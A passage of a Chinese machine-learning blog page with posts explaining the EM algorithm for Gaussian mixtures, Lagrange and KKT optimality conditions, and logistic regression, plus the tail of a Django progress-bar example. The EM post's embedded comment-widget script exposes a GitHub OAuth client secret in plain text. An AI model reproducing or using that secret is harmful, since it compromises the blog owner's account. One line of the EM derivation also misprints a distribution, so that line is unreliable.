class="line">    <span class="comment"># ...</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12345</span>):</div><div class="line">	    <span class="comment"># ... 数据处理业务</span></div><div class="line">	    num_progress = i * <span class="number">100</span> / <span class="number">12345</span>; <span class="comment"># 更新后台进度值，因为想返回百分数所以乘100</span></div><div class="line">    <span class="keyword">return</span> JsonResponse(res, safe=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_progress</span><span class="params">(request)</span>:</span></div><div class="line">    <span class="keyword">return</span> JsonResponse(num_progress, safe=<span class="keyword">False</span>)</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h1><p>未完成形态<br><img src="http://img.blog.csdn.net/20170524194815680?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>完成形态<br><img src="http://img.blog.csdn.net/20170524194715913?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/06/如何理解EM算法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/05/06/如何理解EM算法/" itemprop="url">如何理解EM算法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-06T10:16:00+08:00">
                2017-05-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>介绍EM算法的材料里，我目前看过且觉得比较好的就是NG老师的CS229讲义和李航老师的统计学习方法。<br>我也提不出什么新东西，就结合混合高斯分布，在这两位牛人的基础上，谈一点自己觉得看待EM算法很重要的2个必须弄清楚的问题：为什么要有EM算法，为什么叫E步和M步，还解释了一些介绍EM算法时免不了要提到的公式。如果不把这些问题和公式解释清楚真的能理解em吗？我想可能不能</p>
<h1 id="为什么要有EM算法"><a href="#为什么要有EM算法" class="headerlink" title="为什么要有EM算法"></a>为什么要有EM算法</h1><p>我把EM算法当做最大似然估计的拓展，解决难以给出解析解的最大似然估计（MLE）问题。<br>考虑高斯分布，它的最大似然估计是这样的：</p>
$$\begin{aligned} \theta^*=\arg\max_\theta \sum_X \log L(\theta|X) \end{aligned}{\tag 1}$$
<p>其中，$\theta =(\mu, \sigma), \theta^* =(\mu^*, \sigma^*), \log L(\theta|X) = \log P(X; \theta)$是对数似然函数，分号左边是随机变量，右边是模型参数。$P(X;\theta)$表示X的概率值函数，它是一个以$\theta$为参数的函数（很多人看不懂EM算法就是因为符号问题）。这里对$\theta$求导很容易解出$\theta^*$。</p>
<p>但如果这是个含有隐量Y的模型比如混合高斯模型，<br>$$P(X;\theta)=\sum_{k=1}^K\pi_kN(x; \mu_k, \sigma_k)=\sum_YP(Y;\pi)P(X|Y;\mu,\sigma){\tag 2}$$</p>
<p>上面假设共有K个高斯模型混合.每个高斯模型的参数为$\theta_k=(\mu_k, \sigma_k)$,每个高斯模型占总模型的比重为$\pi_k$。隐变量$Y \in {y_1,y_2,…,y_K}$表示样本$x_i$来自于哪一个高斯分布。分布列为：</p>
<table>
<thead>
<tr>
<th>Y</th>
<th>$y_1$</th>
<th>$y_2$</th>
<th>$y_3$</th>
<th>…</th>
</tr>
</thead>
<tbody>
<tr>
<td>$p(y)$</td>
<td>$\pi_1$</td>
<td>$\pi_2$</td>
<td>$\pi_3$</td>
<td>…</td>
</tr>
</tbody>
</table>
<p>可以认为，混合高斯分布的观测值是这样产生的：先以概率$\pi_k$抽取一个高斯分布$y_k$，再以该高斯分布$N(x;\mu_k, \sigma_k)$去生成观测x。其实这里的$\pi_k$ 就是Y的先验分布$P(Y;\pi)$ (这里特地加上； $\pi$ 表示P(Y)的参数是 $\pi$ ,你需要求出 $\pi$ 才能表示这个先验分布),而 $N(x; \mu_k, \sigma_k)$ 就是给定Y下的条件概率 $P(X|Y;\mu,\sigma)$<br>这时，令$\theta =(\mu, \sigma, \pi), \theta^* =(\mu^*, \sigma^*, \pi^*)$, 最大似然估计成了</p>

$$\begin{aligned} 
\theta^* &= \arg\max_\theta \sum_X \log P(X;\theta) \\
&=\arg\max_\theta \sum_X \log  \sum_YP(Y;\pi)P(X|Y;\mu,\sigma) \\
&=\arg\max_\theta \sum_X \log  \sum_YP(X,Y;\theta)
\end{aligned}\tag 3$$

<p>据群众反映，求和、取对数、再求和，这种形式求偏导较为费劲（到底有多费劲。。。其实放在混合高斯这里也不是那么费劲，有的情形远比混合高斯复杂）要是能把\log 拿到求和的最里层就好了，直接对最里层的式子求偏导岂不快哉？于是就有了EM算法</p>
<h1 id="为什么要分E步和M步"><a href="#为什么要分E步和M步" class="headerlink" title="为什么要分E步和M步"></a>为什么要分E步和M步</h1><p>为了解决这个问题，有人想到了Jensen（琴生）不等式. $\log$ 是个凹函数，以隐变量Y的任一函数$f(Y)$举个例子：<br>$$\log E[f(Y)]=\log \sum_Y P(Y)f(Y) \geq \sum_Y P(Y)\log f(Y)=E[\log f(Y)]\tag 4$$<br>根据琴生不等式的性质，当随机变量函数 f(Y) 为常数时，不等式取等号。上式中的期望换成条件期望，分布 P(Y) 换成条件分布也是一样的。</p>
<p>注意(3)中的联合分布$P(X,Y;\theta)$在执行$\sum_Y$时可以把X看做是定值，此时我们可以把这个联合分布当做Y的随机变量函数（它除以P(Y)当然还是Y的随机变量函数）来考虑，并且引入一个关于Y的分布Q(Y)，具体是啥分布还不清楚,可能是给定某某的条件分布，只知道它是一个关于$\theta$的函数：</p>

$$\begin{aligned}
max &=\max_\theta \sum_X \log  \sum_YP(X,Y;\theta) \\
&=\max_\theta \sum_X \log  \sum_Y Q(Y;\theta) \cdot \frac{P(X,Y;\theta)}{Q(Y;\theta)} \\
&=\max_\theta \sum_X \log  E_Q[\frac{P(X,Y;\theta)}{P(Y;\theta)}] \\
&\geq \max_\theta \sum_X E_Q[\log  \frac{P(X,Y;\theta)}{Q(Y;\theta)}] \\
&= \max_\theta \sum_X \sum_Y Q(Y;\theta) \log  \frac{P(X,Y;\theta)}{Q(Y;\theta)}
\end{aligned}\tag 5$$

<p>只有当<br>$$\frac{P(X,Y;\theta)}{Q(Y;\theta)}=c\tag 6$$<br>式(5)才能取等号，注意到Q是Y的某一分布，有$\sum_Y Q(Y;\theta)=1$这个性质，因此<br>
$$\begin{aligned}
Q(Y;\theta) &= \frac{P(X,Y;\theta)}{c} = \frac{P(X,Y;\theta)}{c \cdot \sum_Y Q(Y;\theta)} \\
&= \frac{P(X,Y;\theta)}{\sum_Y c \cdot Q(Y;\theta)} = \frac{P(X,Y;\theta)}{\sum_Y P(X,Y;\theta)} \\
&= \frac{P(X,Y;\theta)}{P(X;\theta)} = P(Y|X;\theta)
\end{aligned}\tag 7$$
<br>所以只需要把Q取为给定X下，Y的后验分布，就能使式(5)取等号，下一步只需要最大化就行了.这时(5)为<br>$$\theta^* = \arg\max_\theta \sum_X \sum_Y P(Y|X;\theta) \log  \frac{P(X,Y;\theta)}{P(Y|X;\theta)}\tag 8$$</p>
<p>其中：<br>$$P(X,Y;\theta) = P(Y;\pi)P(X|Y;\mu,\sigma)= \pi_kN(x_i; \mu_k, \sigma_k)\tag 9$$<br>$$P(Y|X;\theta) = \frac{P(X,Y;\theta)}{\sum_Y P(X,Y;\theta)}= \frac{\pi_kN(x_i; \mu_k, \sigma_k)}{\sum_{k=1}^K \pi_kN(x_i; \mu_k, \sigma_k)}\tag{10}$$<br>好吧，直接对$(\mu, \sigma, \pi)$求导还是很麻烦，不过已经可以用迭代来最大化啦。</p>
<p>1）先根据式(10)，由$(\mu^{(j)}, \sigma^{(j)}, \pi^{(j)})$求后验概率<br>$$Q^{(j)}=P(Y|X;\theta^{(j)})$$</p>
<p>2）再把$Q^{(j)}$带入(8)中，</p>

$$\begin{aligned}
\theta^{(j+1)} &= \arg\max_\theta \sum_X \sum_Y Q^{(j)} \log  \frac{P(X,Y;\theta)}{Q^{(j)}} \\
&= \arg\max_\theta \sum_X \sum_Y (Q^{(j)} \log  P(X,Y;\theta)-Q^{(j)} \log  Q^{(j)}) \\
&= \arg\max_\theta \sum_X \sum_Y Q^{(j)} \log  P(X,Y;\theta)
\end{aligned}\tag{11}$$

<p>就只需要最大化联合分布$P(X,Y;\theta)$了，最大化求出$(\mu^{(j+1)}, \sigma^{(j+1)}, \pi^{(j+1)})$后重复这2步。</p>
<p>M步很显然，就是最大化那一步，E步又从何谈起呢？式(11)可以写成</p>

$$\begin{aligned}
\theta^{(j+1)} &= \arg\max_\theta \sum_X \sum_Y Q^{(j)} \log  P(X,Y;\theta) \\
&= \arg\max_\theta \sum_X E_{Q^{(j)}} [\log  P(X,Y;\theta)] \\
&= \arg\max_\theta \sum_X E_{Y|X;\theta^{(j)}} [\log  P(X,Y;\theta)] \\
&= \arg\max_\theta \sum_X E_Y [\log  P(X,Y;\theta)|X;\theta^{(j)}]
\end{aligned}\tag{12}$$

<p>其实，E步就是求给定X下的条件期望，也就是后验期望，使得式(5)的琴生不等式能够取等号，是对琴声不等式中,小的那一端进行放大，使其等于大的那一端，这是一次放大；M步最大化联合分布，通过0梯度，拉格朗日法等方法求极值点，又是一次放大。只要似然函数是有界的，只要M步中的0梯度点是极大值点，一直放大下去就能找到最终所求。</p>
<p><a href="https://www.yhihu.com/question/27976634/answer/163164402" target="_blank" rel="external">我的知乎回答</a></p>
<p><div id="container"></div></p>
<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
<script>
var gitment = new Gitment({
  id: 'understanding_em',
  title: '如何理解EM算法',
  owner: 'yiyang186',
  repo: 'blog_comment',
  oauth: {
    client_id: '2786ddc8538588bfc0c8',
    client_secret: '83713f049f4b7296d27fe579a30cdfe9e2e45215',
  },
})
gitment.render('container')
</script>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/03/优化基础问题/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/05/03/优化基础问题/" itemprop="url">优化问题基础</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-03T12:40:00+08:00">
                2017-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="锲子"><a href="#锲子" class="headerlink" title="锲子"></a>锲子</h1><p>最近在看《An Introduction to optimization》，颇有收获，因此想以二维空间$R^2$举例，从简单的无约束的优化（0梯度条件），到等式约束优化(拉格朗日条件)，再到不等式约束优化（KKT条件），写点对于优化问题自己能写的理解。</p>
<h1 id="无约束的优化问题"><a href="#无约束的优化问题" class="headerlink" title="无约束的优化问题"></a>无约束的优化问题</h1><p>$$\min f(x)$$<br>其中，$x=(x_1, x_2)$. 注意我在下图里画了等高线。此时 f(x) 在局部极小值点 $x^*=(x_1^*,x_2^*)$ 处的梯度必然为0，比较容易理解。这个梯度为零的条件是局部极小值点的必要条件。这样，优化问题的求解变成了对该必要条件解方程组。<br><img src="https://pic3.zhimg.com/v2-be1629a8c17870add974d4ae0bf7d77a_b.png" alt="img"></p>
<h1 id="带等式约束的优化问题"><a href="#带等式约束的优化问题" class="headerlink" title="带等式约束的优化问题"></a>带等式约束的优化问题</h1>
$$\begin{aligned}
\min f(x) \\ 
s.t. \quad h(x) = 0
\end{aligned}$$

<p>与无约束的问题不同。我们所要求的极小值点被限制在曲线 $h(x) = 0$ 上，我们将 $\{x|h(x) = 0\}$ 称为可行域, 解只能在这个可行域里取。如下图所示，曲线 $h(x) = 0$ （黑色实曲线）经过无约束极小值点（黑点）附近。那么满足约束的极小值点应该与黑点尽可能近。我们将 $f(x)$ 的等高线不断放大，直到与曲线 $h(x) = 0$ 相切，切点即为所求。相切是关键，是极小值点的必要条件。<br><img src="https://pic1.zhimg.com/v2-549d697c93d9e4d3335c74d597808218_b.png" alt="img"><br>把 $h(x) = 0$ 沿着曲线方向参数化为 $x(t)$ , $x^*=x(t^*)$ 。必有 $f(x)$ 在红点 $x^*$ 的梯度方向与 $x(t)$ 的切线方向垂直，即<br>
$$\nabla f(x^*) \cdot \dot x(t^*) = 0$$
<br>另外，由于 $h(x) = 0$ 为常数，那么也有复合函数  $h(x(t)) = 0$ , 因此 $h(x(t))$ 在 t 的导数必为0，根据链式法则有<br>$$\nabla h(x) \cdot \dot x(t) = 0$$<br> （内积为0，说明 $\nabla h(x^*)$ 与 $\dot x(t^*)$ 垂直）<br>因为 $\nabla f(x^*)$ 垂直于 $\dot{x}(t^*)$ ， $\nabla h(x^*)$ 垂直于 $\dot{x}(t^*)$ ，所以 $\nabla f(x^*)$ 与 $\nabla h(x^*)$ 共线，因此有<br>
$$\nabla f(x^*)+\lambda \nabla h(x^*) = 0$$
<br>$x^*$ 若为最小值点就必须满足上式和问题中的约束 $h(x^*) = 0$ ,这个必要条件就叫作拉格朗日条件，可以定义一个拉格朗日函数<br>$$L(x, \lambda)=f(x)+\lambda h(x)$$<br>令其偏导为0，正好就得到拉格朗日条件。如此，带等式约束的优化问题转化为了无约束的优化问题，只需要对拉格朗日条件解方程组即可。这里$\lambda$就是拉格朗日乘子，有多少个等式约束就有多少个拉格朗日乘子。</p>
<h1 id="带不等式约束的优化问题"><a href="#带不等式约束的优化问题" class="headerlink" title="带不等式约束的优化问题"></a>带不等式约束的优化问题</h1><h2 id="只有一个不等式起作用"><a href="#只有一个不等式起作用" class="headerlink" title="只有一个不等式起作用"></a>只有一个不等式起作用</h2>
$$\begin{aligned}
\min f(x) \\ 
s.t. \quad h(x) \leq0
\end{aligned}$$

<p>当只有一个不等式起作用时, 如我们把问题2里的等式约束 $h(x) = 0$ 改为 $h(x) \leq 0$ ，如下图所示，可行域变成了阴影部分，最小值点还是切点，情况和问题2完全一样，只需要把不等号当做等号去求解即可。<br><img src="https://pic3.zhimg.com/v2-283d1bb0119b63a862f3661b1413bfee_b.png" alt="img"></p>
<h2 id="多于一个不等式起作用"><a href="#多于一个不等式起作用" class="headerlink" title="多于一个不等式起作用"></a>多于一个不等式起作用</h2><p>但是当两个不等式起作用时，那么问题就来了。<br>
$$\begin{aligned}
\min f(x) \\ 
s.t. \quad g_1(x) \leq 0 \\
\quad g_2(x) \leq 0
\end{aligned}$$
<br>如下图，当 $f(x)$ 的等高线慢慢扩大时，等高线与可行域(阴影部分)第一次相遇的点是个顶点，2个不等式同时起作用了。满足约束的最小值点从原来的黑点位置(切点)移动到了红点位置，现在跟哪条约束函数曲线都不相切。这时候就需要用到kkt条件了。这里的“条件”是指：某一个点它如果是最小值点的话，就必须满足这个条件（在含不等式约束的优化问题里）。这是个必要条件，前面说的也全部是必要条件。<br><img src="https://pic4.zhimg.com/v2-7d8461db6ca62803145bc716851bcca3_b.png" alt="img"><br>这个问题的解 $x^*$ 应满足的KKT（卡罗需-库恩-塔克）条件为：</p>
<ol>
<li>$\mu_1 \geq 0 , \mu_2 \geq 0$ ;   </li>
<li>$\nabla f(x^*)+\mu_1\nabla g_1(x^*)+\mu_2\nabla g_2(x^*) = 0$ ;  </li>
<li>$\mu_1g_1(x^*)+\mu_2g_2(x^*) = 0$ .</li>
</ol>
<p>其中，$\mu$叫KKT乘子，有多少个不等式约束就有多少个KKT乘子。加上问题3中的约束部分，就是完整版的KKT条件。对于有等式的情况，你把其中一个不等式约束换成等式，可行域变成了半条曲线，最小值点还是那个红点，和下面这种情况是一样的。<br>下面看看KKT条件是怎么来的。在问题2中我们知道了约束曲线的梯度方向与曲线垂直，我在上图画出了两条约束曲线的负梯度方向（绿色箭头，注意$-\nabla g(x)$ 方向一定指向 $g(x)$ 减小的方向，即 $g(x)<0$ 的那一边）和等高线的梯度方向（红色箭头$\nabla$$f(x^*)$）。如果这个顶点是满足约束的最小值点，那么该点处（红点），红色箭头一定在两个绿色箭头之间。也就是$\nabla$$f(x^*)$能被$-\nabla$$g_1(x^*)$和$-\nabla$$g_2(x^*)$线性表出<br="">
$$\nabla f(x^*)= -\mu_1\nabla g_1(x^*) -\mu_2\nabla g_2(x^*)$$
<br>且系数必非负 $\mu_1 \geq 0 , \mu_2 \geq 0$ 。也就是kkt条件中的1和2。</0$></p>
<ol>
<li>$\mu_1 \geq 0 , \mu_2 \geq 0$ ;</li>
<li>$\nabla f(x^*)+\mu_1\nabla g_1(x^*)+\mu_2\nabla g_2(x^*) = 0$ ;</li>
</ol>
<h2 id="存在不起作用的不等式"><a href="#存在不起作用的不等式" class="headerlink" title="存在不起作用的不等式"></a>存在不起作用的不等式</h2><p>有时候，有的不等式约束实际上不起作用，如下面这个优化问题<br>
$$\begin{aligned}
\min f(x) \\ 
s.t. \quad g_1(x) \leq 0 \\
\quad g_2(x) \leq 0 \\
\quad g_3(x) \leq 0
\end{aligned}$$
<br>如下图的 $g_3(x_1,x_2) \leq 0$ 是不起作用的<br><img src="https://pic3.zhimg.com/v2-07dc9efe827a4a70c684a089472e4076_b.png" alt="img"></p>
<p>对于最小值点 $x^*$ ,三个不等式约束的不同在于<br>$g_1(x^*) = 0$ （起作用）<br>$g_2(x^*) = 0$ （起作用）<br>$g_3(x^*)<0$ （不起作用,="" 最小值点不在="" $g_3(x)="0$" 上）<br="">这时，这个问题的KKT条件1，2成了：</0$></p>
<ol>
<li>$\mu_1 \geq 0 , \mu_2 \geq 0 , \mu_3 \geq 0$ ; </li>
<li>$\nabla f(x^*)+\mu_1\nabla g_1(x^*)+\mu_2\nabla g_2(x^*)+\mu_3\nabla g_3(x^*) = 0$ . </li>
</ol>
<p>条件2中的 $\mu_3\nabla g_3(x^*)$  这一项让我们很苦恼啊， $g_3(x^*)$  的绿色箭头跟我们的红色箭头没关系。要是能令 $\mu_3 = 0$ 就好了。加上条件3：</p>
$$\mu_1g_1(x^*)+\mu_2g_2(x^*)+\mu_3g_3(x^*) = 0$$
<p>恰好能使 $\mu_3 = 0$ 。由于 $g_1(x^*) = 0$ ， $g_2(x^*) = 0$ ，所以前两项等于0，第三项$g_3(x^*) < 0$， 在条件3的作用下使得$\mu_3 = 0$。 正好满足需求。如果再多几项不起作用的不等式约束，比如$g_4(x) \leq 0$。要使</p>
$$\mu_1g_1(x^*)+\mu_2g_2(x^*)+\mu_3g_3(x^*)+\mu_4g_4(x^*) = 0$$
<p>就只能有 $\mu_3g_3(x^*)+\mu_4g_4(x^*) = 0$</p>
<p>同样地， $g_3(x^*) < 0$ , $g_4(x^*) < 0$ , 只能出现 $\mu_3 = \mu_4 = 0$ 或者 $\mu_3$ 和 $\mu_4$ 异号的情况。但注意条件1限制了 $\mu_3 \geq 0, \mu_4 \geq 0$ ，所以只能有 $\mu_3 = \mu_4 = 0$ 。因此不管加了几个不起作用的不等式约束，条件2都能完美实现：目标函数 $f(x)$ 的梯度 $\nabla f(x)$ 被起作用的不等式约束函数 $g(x)$ 的负梯度 $-\nabla g(x)$ 线性表出且系数 $\mu$ 全部非负（红色箭头被绿色箭头夹在中间）。这样，优化问题的求解就变成对所有KKT条件解方程组。</p>
<p>如果再定义一个函数<br>
$$L(x, \mu)=f(x)+\mu_1 g_1(x)+\mu_2 g_2(x)+...$$
<br>令它对x的偏导为0，就是KKT条件中的条件2了。</p>
<h1 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h1><p>顺带一提，以前读李航老师的《统计学习方法》时，当读到SVM部分的KKT条件一段时，觉得摸不着头脑，现在总结一番后清楚了不少。如《统计学习方法》第一版105页式(7.27)中的第1，2行就是这里的KKT条件2（我这里把偏置b算在x里了），第3行是KKT条件3，第4行是问题中的不等式约束，第5行是KKT条件1。</p>
<p>最后说明一下，以上所有都是局部极小值点的必要条件。据此求得的解不一定是局部极小值点（更别提全局了），原因是上图中我所画的等高线也许根本就不闭合，也就是说我们一直想要靠近的等高线中间的黑点压根就是个鞍点或者近似鞍点！</p>
<p><a href="https://www.zhihu.com/question/58584814/answer/159863739" target="_blank" rel="external">我在知乎上的回答</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/01/Logistic回归/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/05/01/Logistic回归/" itemprop="url">逻辑回归</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-01T19:53:00+08:00">
                2017-05-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/机器学习/" itemprop="url" rel="index">
                    <span itemprop="name">机器学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="逻辑回归的建模"><a href="#逻辑回归的建模" class="headerlink" title="逻辑回归的建模"></a>逻辑回归的建模</h1><h2 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h2><p>说道建模，总有一些粗暴的地方，即强行给真实模型$f$指定某种形式$\hat f$，像线性回归里就强行指定了$\hat f(x)=\beta^T x, x \in R^p, \beta \in  R^{p+1}$这种形式，然后依靠所找到的最优的$\beta$使$\hat f$尽量接近$f$。<br>分类问题与回归的问题的不同在于y的值域不同，对于分类问题，我们想把样本x分到$y\in \{a,b,c,d,...\}$的类别中。这样，我们希望拟合y在给定x下的条件概率$P(y=a,b,...|x)$。概率的值域为[0,1]。由于我们不能保证内积的结果在[0,1]之内，所以线性回归的那种内积的形式就不适用了，我们就不能以这种形式的模型去拟合真实模型。<br>人们找到一种叫sigmoid(s型)的函数<br><img src="http://img.blog.csdn.net/20170621150508657?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>$$y=g(x)=\frac{1}{1+e^{-x}}, x\in R, y\in(0,1)\tag 1$$<br>它可以把范围在$(-\infty, +\infty)$的值映射到$(0,1)$里去，由于它是单调递增函数，因此可以保持输入值的单调性、奇偶性、周期型。把$\hat f(x)=\beta^T x$带入其中得到<br>$$h_\beta(x)=g(\beta^Tx)=\frac{1}{1+e^{-\beta^T x}}\tag 2$$</p>
<h2 id="二分类"><a href="#二分类" class="headerlink" title="二分类"></a>二分类</h2><p>对于二分类问题$y\in \{0,1\}$，我们<strong>假设</strong><br>$$
\begin{equation}
\left\{
\begin{array}{c}
P(y=1|x; \beta) &=& h_\beta(x)=\frac{1}{1+e^{-\beta^T x}}\\
P(y=0|x; \beta) &=& 1 - h_\beta(x)=\frac{e^{-\beta^T x}}{1+e^{-\beta^T x}}\\
\end{array}
\right.
\end{equation}
x \in R^p, \beta \in  R^{p+1}
\tag 3$$<br>可能因为这种模型的结果是在0, 1之间，且保持了线性回归模型的内积形式，因此它被称作logistic regression，即逻辑回归，或逻辑斯蒂回归。</p>
<h2 id="逻辑回归的特质"><a href="#逻辑回归的特质" class="headerlink" title="逻辑回归的特质"></a>逻辑回归的特质</h2><p>将(3)中的2个等式取对数相比（log-odd）得<br>$$\log{{P(y=1|x)}\over {P(y=0|x)}}=\beta ^Tx \tag4$$<br>可以发现以下特质，<strong>考虑任意样本$x_0$</strong>：</p>
<ol>
<li>当$P(y=1|x_0)>P(y=0|x_0)$时，$x_0$被分类到$\beta^Tx=0$的&gt;0的一边;</li>
<li>当$P(y=1|x_0)$ < $P(y=0|x_0)$时，$x_0$被分类到$\beta^Tx=0$的&lt;0的一边;</li>
<li>当$P(y=1|x_0)=P(y=0|x_0)$时，$x_0$在平面$\beta^Tx=0$上.</li>
</ol>
<p>可见Logistic Regression仍然是一种线性方法，即用平面($\beta ^Tx=0$)来分类。在二分类问题中，样本在超平面的一边就属于一类, 这个平面就是类与类之间的边界。<br>可以认为逻辑回归实际上式以(4)建模的。它认为一个样本属于类1的概率P(y=1|x)大的话，它应当在分类平面$\beta^Tx=0$的一边，即满足$\beta^Tx>0$；当这个样本属于0类概率 P(y=0|x)大时，它应当在分类平面$\beta^Tx=0$的另一边，即满足$\beta^Tx<0$ 。并且，它严格地假设了两类条件概率的对数比是线性的，可以被输入x线性表出。我们知道由于类密度高斯假设和公共协方差假设，lda(线性判别分析)的log-odd是x的线性函数，与(4)形式一样。<strong="">而Logistic绕过了这2个假设以式(4)建模。逻辑回归不要求样本满足类密度高斯假设和公共协方差假，更具一般性。</0$></p>
<p>其实，我们忘掉sigmoid函数，直接拿(4)来建模，粗暴地假设类对数比率(log-odd)是关于x的线性函数，又由于样本属于两类的概率之和为1<br>$$P(y=1|x)+P(y=0|x)=1\tag5$$</p>
<p>联立(4)(5)，解未知数为P(Y=1|x)和P(Y=-1|x)的方程还是可以得到式(3)，自然含有sigmoid函数。</p>
<h2 id="多分类"><a href="#多分类" class="headerlink" title="多分类"></a>多分类</h2><p>对于K分类问题，如$y\in \{1,2,...,K\}$，我们希望模型拟合的是y的后验分布$P(y=i|x), i=1,2,...,K$。像二分类一样，如法炮制，假设两两类的条件概率对数比(log-odd)是关于x的线性函数，这样我们能列$\binom{K}{2}=\frac{K(K-1)}{2}$个方程。可是我们只有K个未知数，只需要列K个方程就行了，不妨取1,2,…,K-1类分别与K类的对数比来列方程，并限制样本属于K个类的概率的和为1，则<br>$$
\begin{equation}
   \left\{
   \begin{array}{c}
   \log{{P(y=1|x)}\over {P(y=K|x)}} &=&\beta_1 ^Tx\\
   \log{{P(y=2|x)}\over {P(y=K|x)}} &=&\beta_2 ^Tx\\
   ...\\
   \log{{P(y=K-1|x)}\over {P(y=K|x)}} &=&\beta_{K-1} ^Tx\\
   \sum_{i=1}^KP(y=i|x) &=& 1
   \end{array}
  \right.
\end{equation}
x \in R^p, \beta_k \in  R^{p+1}, k=1,2,...,K-1
\tag 6$$<br>解方程组得到多分类的模型<br>$$
\begin{equation}
  \left\{
   \begin{array}{c}
